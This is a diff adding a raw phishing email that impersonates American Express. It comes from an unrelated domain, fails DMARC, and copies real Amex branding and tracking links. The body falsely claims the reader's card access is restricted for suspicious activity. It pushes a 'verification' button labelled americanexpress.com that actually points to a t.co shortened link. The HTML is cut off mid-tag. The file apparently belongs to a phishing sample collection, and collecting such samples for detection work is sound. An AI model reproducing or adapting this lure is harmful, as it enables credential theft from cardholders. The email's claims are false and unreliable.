@@ -1,0 +1,412 @@
+Return-Path: <zingerpie@kfcreview.com>
+Received: from kfcreview.com ([96.71.227.169])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 1p97br5gqognm4pf2kmh811vf2cgbduuef754r01
+ for zingerpie@kfcreview.com;
+ Wed, 26 Aug 2026 10:34:30 +0000 (UTC)
+Received-SPF: none (spfCheck: 96.71.227.169 is neither permitted nor denied by domain of kfcreview.com) client-ip=96.71.227.169; envelope-from=zingerpie@kfcreview.com; helo=kfcreview.com;
+Authentication-Results: amazonses.com;
+ spf=none (spfCheck: 96.71.227.169 is neither permitted nor denied by domain of kfcreview.com) client-ip=96.71.227.169; envelope-from=zingerpie@kfcreview.com; helo=kfcreview.com;
+ dmarc=fail header.from=kfcreview.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFIZ0l0czg3QVY5MUpldHpUWTVlalFCMVFLMjNZcE1yd1ZjdnIzTUlJN2h6UkpETGFkM2VYNnliYW5RQ1lSMHhUeG5kZTVDMVlac2hRUUFNTzNYZ1kwSkNOZ1huTUYvblY3eXpCYmlmVWQwMkFIM2pDczF0UXdrZFlSMHFMNDI5aU9CMW5qTDRKMUxtQ1hVekZSWHo1UDNBQmZ0Sy9xUlpocWtobTJ4SmVTbEgvRWt2WHBEdmxmbldEbFBXeGZRcGxvVEdiK0hLRTljWDBJbThKYmh6bzlzUGIrSWduWjduMmcyeEpYK0FBN2dxOGQzU25EM3RMbk5BdFdweHBqNHhla3g2dHE5dDZ6Wkowdkx5RnVwNHRDelBCWkh0dTRnSUhwZnpGK1UxTGxBWEpiMmt4eE9VTUVGS3QzL2Nrb1gzY289
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=iZdgSoemTWAMn1ZwlBQ/v6o9tsbVoLxH939YS7miqzQOnh4elgo+YZkkzYBX/fmace2M0u82sDtO9hLw08IqwUDdDBHqJv4DiaS/LlXwWipsNoka0t4On2gAmHvx69JS0XBUJtz5VNtmylUMUAh5wowi3PxorbFZ9U1AOmhm6IE=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1787740471; v=1; bh=pX1yTIuEj/zLk+TLLiQUY1dXZ0wR2Egj3extu4t+Mx8=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+From: "American Express" <zingerpie@kfcreview.com>
+To: zingerpie@kfcreview.com
+Subject: Your card is temporarily flagged
+Date: 26 Aug 2026 03:31:48 -0700
+Message-ID: <20260826033148.59C0BAD5135498E8@kfcreview.com>
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
+<BODY><IMG src=3D"https://www.aejohg.com/p/cp/a4d385ec1b70d62b/o.gif?mi_u=
+=3D2be60364ad04b3f1f1938ec822d817d221dcf60dee186070ddf746580a4fce4b" width=
+=3D1 height=3D1> </TD></TR></TBODY></TABLE>
+<DIV lang=3Den style=3D"FONT-SIZE: 15px; FONT-FAMILY: Helvetica Neue, Helve=
+tica, Arial, sans-serif; FONT-WEIGHT: normal; LINE-HEIGHT: 22px">
+<TABLE style=3D"BACKGROUND: #d9d9d6" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD bgColor=3D#d9d9d6 background=3Dhttp://image.member.americanexpress.com/=
+lib/fe9c13727565067e71/m/4/AMXIMG_WSP-Grey.png align=3Dcenter>
+<TABLE class=3Dv1container style=3D"WIDTH: 620px" cellSpacing=3D0 cellPaddi=
+ng=3D0 width=3D620 border=3D0>
+<TBODY>
+<TR>
+<TD>
+<STYLE type=3Dtext/css>@media print{ #message-htmlpart1 div.rcmBody #_two50=
+ {} } #message-htmlpart1 div.rcmBody blockquote #_two50, #message-htmlpart1=
+ div.rcmBody #mailContainerBody #_two50, #message-htmlpart1 div.rcmBody div=
+=2EOutlookMessageHeader, #message-htmlpart1 div.rcmBody table.moz-email-hea=
+ders-table {}</STYLE>
+
+<DIV id=3Dv1_two50></DIV>
+<IMG id=3Dv1_two50_img style=3D"BORDER-TOP: 0px; HEIGHT: 1px !important; BO=
+RDER-RIGHT: 0px; WIDTH: 1px !important; BORDER-BOTTOM: 0px; PADDING-BOTTOM:=
+ 0px !important; PADDING-TOP: 0px !important; PADDING-LEFT: 0px !important;=
+ BORDER-LEFT: 0px; MARGIN: 0px; DISPLAY: none; PADDING-RIGHT: 0px !importan=
+t"=20
+src=3D"http://250analytics.americanexpress.com/ea/JYe8qzBMxd/?e=3D2be60364a=
+d04b3f1f1938ec822d817d221dcf60dee186070ddf746580a4fce4b&amp;bu=3DU004&amp;c=
+ellid=3D2222JWJ4&amp;c=3DAGBCUMCA&amp;emailtype=3D011&amp;grancat=3DMKMEMB&=
+amp;requestid=3D83123" width=3D1 height=3D1>=20
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 8px; PADDING-TOP: 8px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px"></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#ffffff bor=
+der=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1pd10 style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 20px; PADDIN=
+G-LEFT: 20px; PADDING-RIGHT: 20px">
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"WIDTH: 137px" vAlign=3Dtop width=3D137>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1bp-logo style=3D"WIDTH: 60px" width=3D60><A href=3D"https://c=
+lick.member.americanexpress.com/?qs=3D61e4ed4cc9912953b01f50790df280e6d97a6=
+7b332c3017909efb13f852be4c2c576ee95720f0772cf8c5266eb9264891849fb018cafe404=
+" rel=3Dnoreferrer target=3D_blank><IMG title=3D"American Express Logo" cla=
+ss=3Dv1bp-logo style=3D"HEIGHT: auto; WIDTH: 60px; COLOR: #333333" alt=3D"A=
+MERICAN EXPRESS" src=3D"https://image.member.americanexpress.com/lib/fe9013=
+727565037a72/m/25/2022_v4.0_amex-logo.jpg" width=3D60> </A></TD>
+<TD class=3Dv1mobile-off style=3D"PADDING-LEFT: 5px" width=3D90><A href=3D"=
+https://click.member.americanexpress.com/?qs=3D61e4ed4cc9912953e763a001bc14=
+203010fee394edaa28c24a23eb094034585d0c02474cf31ae0f945ffbe613f4098dae72b0d3=
+c9d33a38c" rel=3Dnoreferrer target=3D_blank><IMG title=3D"Don't Live Life W=
+ithout It" style=3D"HEIGHT: auto; WIDTH: 85px; COLOR: #333333" alt=3D"Don't=
+ Live Life Without It" src=3D"https://image.member.americanexpress.com/lib/=
+fe9013727565037a72/m/25/2022_v4.0_dllwi.jpg" width=3D85> </A></TD></TR>
+</TBODY></TABLE></TD>
+<TD vAlign=3Dtop align=3Dright>
+<P class=3Dv1bp-text style=3D"FONT-SIZE: 15px; COLOR: #333333; LINE-HEIGHT:=
+ 22px">Account ending: 37-xxxxx</P></TD>
+<TD class=3Dv1bp02-card style=3D"PADDING-LEFT: 12px" vAlign=3Dtop width=3D8=
+0 align=3Dright><IMG title=3D"American Express Card" class=3Dv1bp02-card st=
+yle=3D"HEIGHT: 50px; WIDTH: 80px; COLOR: #333333" alt=3D"American Express C=
+ard" src=3D"https://global.americanexpress.com/myca/shared/summary/cardasse=
+t/images/NUS000000237_240x152_STRAIGHT.png" width=3D80> </TD></TR></TBODY><=
+/TABLE></TD></TR>
+<TR>
+<TD class=3Dv1pd10 style=3D"BORDER-TOP: #d9d9d6 1px solid; BORDER-BOTTOM: #=
+d9d9d6 1px solid; PADDING-BOTTOM: 11px; PADDING-TOP: 10px; PADDING-LEFT: 20=
+px; PADDING-RIGHT: 20px"></TD></TR></TBODY></TABLE></TD></TR></TBODY></TABL=
+E></TD></TR></TBODY></TABLE>
+<TABLE class=3Dv1container style=3D"WIDTH: 620px; BACKGROUND: #ffffff" cell=
+Spacing=3D0 cellPadding=3D0 width=3D620 border=3D0>
+<TBODY>
+<TR>
+<TD>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#006fcf bor=
+der=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1mw30 style=3D"WIDTH: 91px" width=3D91 align=3Dcenter>&nbsp;</=
+TD>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 40px; PADDING-LEFT: 0px; PAD=
+DING-RIGHT: 0px" align=3Dcenter><IMG style=3D"HEIGHT: 14px; COLOR: #ffffff;=
+ DISPLAY: block" alt=3D"American Express logo" src=3D"https://image.member.=
+americanexpress.com/lib/fe9013727565037a72/m/1/83123_logo_amex.png" width=
+=3D222>=20
+<P style=3D"FONT-SIZE: 0px; COLOR: #ffffff; MARGIN: 35px 0px 0px; LINE-HEIG=
+HT: 0px">&nbsp;</P><IMG class=3Dv1full-width style=3D"HEIGHT: auto; COLOR: =
+#ffffff; DISPLAY: block" alt=3D"lights animation" src=3D"https://image.memb=
+er.americanexpress.com/lib/fe9013727565037a72/m/1/83123_lights_animated.gif=
+" width=3D438>&nbsp;<FONT color=3D#ffffff><STRONG>PLATINUM&nbsp;AND&nbsp;GO=
+LD CARD&nbsp;MEMBERS</STRONG></FONT>
+ <IMG class=3Dv1full-width style=3D"HEIGHT: auto; COLOR: #ffffff; DISPLAY: =
+block" alt=3D"lights animation" src=3D"https://image.member.americanexpress=
+=2Ecom/lib/fe9013727565037a72/m/1/83123_lights_animated.gif" width=3D438>&n=
+bsp;</TD>
+<TD class=3Dv1mw30 style=3D"WIDTH: 91px" width=3D91 align=3Dcenter>&nbsp;</=
+TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 15px; PADDING-LEFT: 30px; P=
+ADDING-RIGHT: 30px" colSpan=3D3 align=3Dcenter>
+<P style=3D"FONT-SIZE: 18px; COLOR: #ffffff; MARGIN: 0px; LINE-HEIGHT: 26px=
+">&nbsp;</P></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#006fcf bor=
+der=3D0>
+<TBODY>
+<TR vAlign=3Dtop>
+<TD class=3Dv1mobile-off style=3D"WIDTH: 35px" width=3D35 align=3Dcenter>&n=
+bsp;</TD>
+<TD style=3D"WIDTH: 60px" width=3D60 align=3Dcenter><IMG style=3D"HEIGHT: 6=
+0px; COLOR: #ffffff; DISPLAY: block" alt=3D"star burst" src=3D"https://imag=
+e.member.americanexpress.com/lib/fe9013727565037a72/m/1/83123_burst_big_ani=
+mated.gif" width=3D60> </TD>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" align=3Dcenter><IMG class=3Dv1full-width style=3D"HEIGHT: a=
+uto; WIDTH: 296px; COLOR: #ffffff; DISPLAY: block" alt=3D"The Platinum Card=
+&reg; from American Express" src=3D"https://image.member.americanexpress.co=
+m/lib/fe9013727565037a72/m/1/83123_card_plat.png" width=3D296> </TD>
+<TD style=3D"WIDTH: 60px" width=3D60 align=3Dcenter>&nbsp;</TD>
+<TD class=3Dv1mobile-off style=3D"WIDTH: 35px" width=3D35 align=3Dcenter>&n=
+bsp;</TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#00175a bor=
+der=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1mw20 style=3D"FONT-SIZE: 0px; WIDTH: 30px; LINE-HEIGHT: 0px" =
+bgColor=3D#00175a width=3D30 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" align=3Dcenter>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" bgColor=3D#00175a align=3Dcenter>&nbsp; </TD></TR>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 20px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PAD=
+DING-RIGHT: 0px" bgColor=3D#ffffff align=3Dcenter>
+<P style=3D"FONT-SIZE: 26px; FONT-FAMILY: BentonSans, Helvetica, Arial, san=
+s-serif; COLOR: #00175a; MARGIN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 28p=
+x"><BR>&nbsp;</P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter><B>Updated Security validati=
+on prefrences&nbsp;For Platinum and Business Gold cardholders.</B></P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter>&nbsp;</P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter>Your access to americanexpre=
+ss.com has been temporarily restricted because of suspicious activity on yo=
+ur card. <BR><BR>Please confirm if this was you. If not, log on to<BR></P>
+<P style=3D"FONT-SIZE: 10pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: black"></P>
+<P style=3D"FONT-SIZE: 26px; FONT-FAMILY: BentonSans, Helvetica, Arial, san=
+s-serif; COLOR: #00175a; MARGIN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 28p=
+x"><BR>&nbsp;</P>
+<P style=3D"FONT-SIZE: 10pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: black" align=3Dcenter></P>
+<P style=3D"FONT-SIZE: 26px; FONT-FAMILY: BentonSans, Helvetica, Arial, san=
+s-serif; COLOR: #00175a; MARGIN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 28p=
+x">
+<TABLE style=3D"MARGIN-LEFT: auto; MARGIN-RIGHT: auto" cellSpacing=3D0 cell=
+Padding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"BORDER-TOP: #00175a 2px solid; BORDER-RIGHT: #00175a 2px solid=
+; BORDER-BOTTOM: #00175a 2px solid; BORDER-LEFT: #00175a 2px solid; -moz-bo=
+rder-radius: 6px; -webkit-border-radius: 6px; border-radius: 6px" bgColor=
+=3D#00175a width=3D270 align=3Dcenter>
+<A style=3D"FONT-SIZE: 13pt; TEXT-DECORATION: none; BORDER-TOP: #00175a 1px=
+ solid; FONT-FAMILY: Arial; BORDER-RIGHT: #00175a 1px solid; WIDTH: 270px; =
+BACKGROUND: #00175a; BORDER-BOTTOM: #00175a 1px solid; FONT-WEIGHT: bold; C=
+OLOR: #ffffff; PADDING-BOTTOM: 10px; TEXT-ALIGN: center; PADDING-TOP: 10px;=
+ PADDING-LEFT: 10px; BORDER-LEFT: #00175a 1px solid; DISPLAY: block; LINE-H=
+EIGHT: 25px; PADDING-RIGHT: 10px; -moz-border-radius: 20px; -webkit-border-=
+radius: 20px; border-radius: 20px"=20
+href=3D"https://t.co/MlbqaZUo10" shape=3Drect rel=3Dnoreferrer target=3D_bl=
+ank>americanexpress.com</A></TD></TR></TBODY></TABLE></P>
+<P style=3D"FONT-SIZE: 10pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: black"></P>
+<P style=3D"FONT-SIZE: 26px; FONT-FAMILY: BentonSans, Helvetica, Arial, san=
+s-serif; COLOR: #00175a; MARGIN: 0px; LETTER-SPACING: 0px; LINE-HEIGHT: 28p=
+x"><BR>&nbsp;</P>
+<P style=3D"FONT-SIZE: 10pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: black" align=3Dcenter></P>
+<P style=3D"FONT-SIZE: 10pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: black"></P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter>Follow and complete the veri=
+fication Process<BR>Once verified, Your card will be removed from the restr=
+icted list.</P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter></P>
+<P style=3D"FONT-SIZE: 13pt; MARGIN-BOTTOM: 0px; FONT-FAMILY: Arial; MARGIN=
+-TOP: 0px; COLOR: rgb(0,23,90)" align=3Dcenter><BR>Your protection is our p=
+riority, and these enhancements are designed to ensure a secure</P></TD></T=
+R>
+<TR vAlign=3Dtop>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" bgColor=3D#ffffff align=3Dcenter>
+<TABLE dir=3Dltr cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>=
+
+<TBODY>
+<TR vAlign=3Dtop>
+<TH class=3Dv1full-width-block dir=3Dltr vAlign=3Dtop width=3D280 align=3Dc=
+enter><A style=3D"COLOR: #333333" href=3D"https://click.member.americanexpr=
+ess.com/?qs=3D61e4ed4cc99129533be2dc2c393adb1cd003fecbeaf6f761dfecd2311d3da=
+4c9a28b193e080ba05e901505edba9d22986aa2f6b9bb8eeecc" rel=3Dnoreferrer targe=
+t=3D_blank></A>&nbsp;</TH>
+<TH class=3Dv1full-width-block dir=3Dltr vAlign=3Dtop width=3D280 align=3Dc=
+enter><A style=3D"COLOR: #333333" href=3D"https://click.member.americanexpr=
+ess.com/?qs=3D61e4ed4cc9912953b18b3a450ca7b9b810f5300b01bbddb22ff5c005b5038=
+5a6555b757cd829578692e56dc6b7ca02be4c6e035e27a93dee" rel=3Dnoreferrer targe=
+t=3D_blank></A>&nbsp;</TH></TR></TBODY></TABLE></TD></TR>
+<TR vAlign=3Dtop>
+<TD style=3D"PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; PADD=
+ING-RIGHT: 0px" bgColor=3D#00175a align=3Dcenter>&nbsp;&nbsp; </TD></TR></T=
+BODY></TABLE></TD>
+<TD class=3Dv1mw20 style=3D"FONT-SIZE: 0px; WIDTH: 30px; LINE-HEIGHT: 0px" =
+bgColor=3D#00175a width=3D30 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE=
+>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#006fcf bor=
+der=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1mw20 style=3D"FONT-SIZE: 0px; WIDTH: 30px; LINE-HEIGHT: 0px" =
+bgColor=3D#006fcf width=3D30 align=3Dcenter>&nbsp;</TD>
+<TD style=3D"FONT-SIZE: 0px; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING=
+-LEFT: 0px; LINE-HEIGHT: 0px; PADDING-RIGHT: 0px" bgColor=3D#ffffff align=
+=3Dcenter><A style=3D"COLOR: #333333" href=3D"https://click.member.american=
+express.com/?qs=3D61e4ed4cc99129530d29768f9b17646b4f9a8e51e892e67325e91366c=
+315aa2df2563751ad5aa95517e85fd2baa68c964ea7baad82cd3d3e" rel=3Dnoreferrer t=
+arget=3D_blank></A>
+&nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.member.americanexpr=
+ess.com/?qs=3D61e4ed4cc99129537d01a40009acb379acd9b9711ee48ce6b139b5c743145=
+83f8663793a9249544dc40d66e2f2fe2c3df4f5784d605fe8e9" rel=3Dnoreferrer targe=
+t=3D_blank></A>&nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.memb=
+er.americanexpress.com/?qs=3D61e4ed4cc99129536f2972a051c6666482144768198227=
+7fae7924119aaf1219c7b6465501c34cf88caeb5825ca7e7f5804540ccc1caa305" rel=3Dn=
+oreferrer target=3D_blank></A>
+ &nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.member.americanexp=
+ress.com/?qs=3D61e4ed4cc991295349c1c77f0a286a0607c4f3b9bf2d96148773ee86e07c=
+f1e36ca75f51079715463aa7f70ff4969087329f4300dcabaef8" rel=3Dnoreferrer targ=
+et=3D_blank></A>&nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.mem=
+ber.americanexpress.com/?qs=3D61e4ed4cc9912953357a276d112fc87bcc3023d7bd25d=
+6b3ac79acdc0b28540f5218ce89ece4755069f30c2ad2efae1485e28b0e6f42281c" rel=3D=
+noreferrer target=3D_blank></A>
+ &nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.member.americanexp=
+ress.com/?qs=3D61e4ed4cc9912953328f07a0b06e5ea1afdc20eaa4cad9022f3a6466e05d=
+eeafe49c69647430a47a3c01977723e61809cf5830132e8cae51" rel=3Dnoreferrer targ=
+et=3D_blank></A>&nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.mem=
+ber.americanexpress.com/?qs=3D61e4ed4cc9912953d5840006afb545f2e893760578aa5=
+4989853e08eb19d6a8be7e599a30c9567b068b9ceaf315b59fadbb91bf6a4a2e1a2" rel=3D=
+noreferrer target=3D_blank></A>
+ &nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.member.americanexp=
+ress.com/?qs=3D61e4ed4cc9912953304695c11e48b996f241d987b04be29eb21554fa87fe=
+b5830e8a254a647a8722d7541100aa546843128de8a38e27032c" rel=3Dnoreferrer targ=
+et=3D_blank></A>&nbsp;<A style=3D"COLOR: #333333" href=3D"https://click.mem=
+ber.americanexpress.com/?qs=3D61e4ed4cc9912953bf84576d173d75206932a8d15287f=
+21aee7c7d6589f62faba3e4117ca3b473395d6cf4c167d99381d76b7d3dcf52a03a" rel=3D=
+noreferrer target=3D_blank></A> </TD>
+<TD class=3Dv1mw20 style=3D"FONT-SIZE: 0px; WIDTH: 30px; LINE-HEIGHT: 0px" =
+bgColor=3D#006fcf width=3D30 align=3Dcenter>&nbsp;</TD></TR></TBODY></TABLE=
+>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" bgColor=3D#006fcf bor=
+der=3D0>
+<TBODY>
+<TR>
+<TD class=3D"v1mw30 v1mw-310" style=3D"WIDTH: 91px" width=3D91 align=3Dcent=
+er>&nbsp;</TD>
+<TD style=3D"PADDING-BOTTOM: 40px; PADDING-TOP: 40px; PADDING-LEFT: 30px; P=
+ADDING-RIGHT: 30px" align=3Dcenter><IMG class=3Dv1full-width style=3D"HEIGH=
+T: auto; COLOR: #ffffff; DISPLAY: block" alt=3D"lights animation" src=3D"ht=
+tps://image.member.americanexpress.com/lib/fe9013727565037a72/m/1/83123_lig=
+hts_animated.gif" width=3D438>=20
+<P style=3D"FONT-SIZE: 26px; COLOR: #ffffff; MARGIN: 30px 0px 0px; LINE-HEI=
+GHT: 34px"><STRONG>Thank you for continuing your <BR class=3Dv1dbr>Card Mem=
+bership</STRONG></P>
+<P style=3D"FONT-SIZE: 15px; COLOR: #ffffff; MARGIN: 25px 0px 30px; LINE-HE=
+IGHT: 22px">We look forward to you getting more out of your <BR class=3Dv1d=
+br>Card Membership this&nbsp;year.</P><IMG class=3Dv1full-width style=3D"HE=
+IGHT: auto; COLOR: #ffffff; DISPLAY: block" alt=3D"lights animation" src=3D=
+"https://image.member.americanexpress.com/lib/fe9013727565037a72/m/1/83123_=
+lights_animated.gif" width=3D438> </TD>
+<TD class=3D"v1mw30 v1mw-310" style=3D"WIDTH: 91px" width=3D91 align=3Dcent=
+er>&nbsp;</TD></TR></TBODY></TABLE>
+<TABLE style=3D"BACKGROUND: #f7f8f9" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD style=3D"PADDING-BOTTOM: 14px; PADDING-TOP: 14px; PADDING-LEFT: 0px; PA=
+DDING-RIGHT: 0px" height=3D14>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD>
+<HR style=3D"BORDER-LEFT-WIDTH: 0px; HEIGHT: 1px; BORDER-RIGHT-WIDTH: 0px; =
+BACKGROUND: #000; BORDER-BOTTOM-WIDTH: 0px; COLOR: #000; BORDER-TOP-WIDTH: =
+0px">
+</TD>
+<TD class=3Dv1pd10 style=3D"WIDTH: 420px; PADDING-BOTTOM: 0px; PADDING-TOP:=
+ 0px; PADDING-LEFT: 20px; PADDING-RIGHT: 20px" vAlign=3Dmiddle align=3Dcent=
+er>
+<P style=3D"FONT-SIZE: 14px; TEXT-TRANSFORM: uppercase; FONT-WEIGHT: 700; C=
+OLOR: #333333; LINE-HEIGHT: 18px">Explore more with your American&nbsp;Expr=
+ess<SPAN style=3D"FONT-SIZE: 11px; VERTICAL-ALIGN: 2px">&reg;</SPAN>&nbsp;C=
+ard </P></TD>
+<TD>
+<HR style=3D"BORDER-LEFT-WIDTH: 0px; HEIGHT: 1px; BORDER-RIGHT-WIDTH: 0px; =
+BACKGROUND: #000; BORDER-BOTTOM-WIDTH: 0px; COLOR: #000; BORDER-TOP-WIDTH: =
+0px">
+</TD></TR></TBODY></TABLE></TD></TR></TBODY></TABLE>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TH class=3D"v1full-width-block v1pdtop20" vAlign=3Dtop align=3Dleft><A hre=
+f=3D"https://click.member.americanexpress.com/?qs=3Dbf81f5c41b1af122bcdb2e4=
+8d23b7cf41c9710039d00d9d44f45ff8eba10cf55568ec4fcdae79d7bbcd13e85547ea5b5da=
+844cf209843f51" rel=3Dnoreferrer target=3D_blank><IMG class=3Dv1center-alig=
+n style=3D"HEIGHT: auto; COLOR: #333333; DISPLAY: block" alt=3Dapp-icon src=
+=3D"https://image.member.americanexpress.com/lib/fe9013727565037a72/m/25/20=
+22_v4.0_tm08-mobile-app-graphic.png" width=3D207></A> </TH>
+<TH class=3Dv1full-width-auto style=3D"FONT-WEIGHT: normal; PADDING-BOTTOM:=
+ 34px; PADDING-TOP: 34px; PADDING-LEFT: 40px; PADDING-RIGHT: 40px" align=3D=
+left>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1center-text style=3D"PADDING-BOTTOM: 12px; PADDING-TOP: 0px; =
+PADDING-LEFT: 0px; PADDING-RIGHT: 0px" colSpan=3D2>
+<TABLE cellSpacing=3D0 cellPadding=3D0 width=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1center-text align=3Dleft>
+<H2 style=3D"FONT-SIZE: 15px; FONT-WEIGHT: 700; COLOR: #333333; MARGIN: 0px=
+; LINE-HEIGHT: 22px">Get the American Express<SPAN style=3D"FONT-SIZE: 11px=
+; VERTICAL-ALIGN: 2px">&reg;</SPAN> App </H2>
+<P style=3D"FONT-SIZE: 15px; COLOR: #333333; MARGIN: 8px 0px 0px; DISPLAY: =
+block; LINE-HEIGHT: 22px">Manage your account on the go by turning on alert=
+s, monitoring charges, and much more. </P></TD></TR></TBODY></TABLE></TD></=
+TR>
+<TR>
+<TD class=3Dv1center-align-table align=3Dleft>
+<TABLE cellSpacing=3D0 cellPadding=3D0 border=3D0>
+<TBODY>
+<TR>
+<TD class=3Dv1pd10 style=3D"PADDING-RIGHT: 20px"><A href=3D"https://click.m=
+ember.americanexpress.com/?qs=3Dbf81f5c41b1af12259b80f59f7c7794fd268558fbb5=
+ba5ed3329987d72c8250cad69ed1b0fc7cbcf1f636612ffb46fac2e637563a43b31a0" rel=
+=3Dnoreferrer target=3D_blank><IMG style=3D"HEIGHT: auto; COLOR: #333333; D=
+ISPLAY: block" alt=3D"Apple Store" src=3D"https://image.member.americanexpr=
+ess.com/lib/fe9013727565037a72/m/25/2022_v4.0_tm08-button-app-store.png" wi=
+dth=3D100> </A></TD>
+<TD class=3Dv1pd10><A href=3D"https://click.member.americanexpress.com/?qs=
+=3Dbf81f5c41b1af1220dcf10b503c4b0c012eb9ef9c153c9dee0ffff00d7cfdc15223e1472=
+9dae79c3c4af583acbe4915591b89f802a9fc78e" rel=3Dnoreferrer target=3D_blank>=
+<IMG style=3D"HEIGHT: auto; COLOR: #333333; DISPLAY: block" alt=3D"Google P=
+lay" src=3D"https://image.member.americanexpress.com/lib/fe9c13727565067e71=
+/m/4/2022_v4.0_fm07_mobileApp_google-play-badge.png" width=3D128> </A></TD>=
+</TR></TBODY></TABLE></TD></TR></TBODY></TABLE></TH></TR></TBODY>
+</TABLE>
+<TABLE style=3D"BACKGROUND: #00175b" cellSpacing=3D0 cellPadding=3D0 width=
+=3D"100%" border=3D0>
+<TBODY>
+<TR>
+<TD align=3Dcenter><IMG title=3D"Don't Live Life Without It" class=3Dv1full=
+-width-block style=3D"HEIGHT: auto; COLOR: #ffffff; DISPLAY: block" alt=3D"=
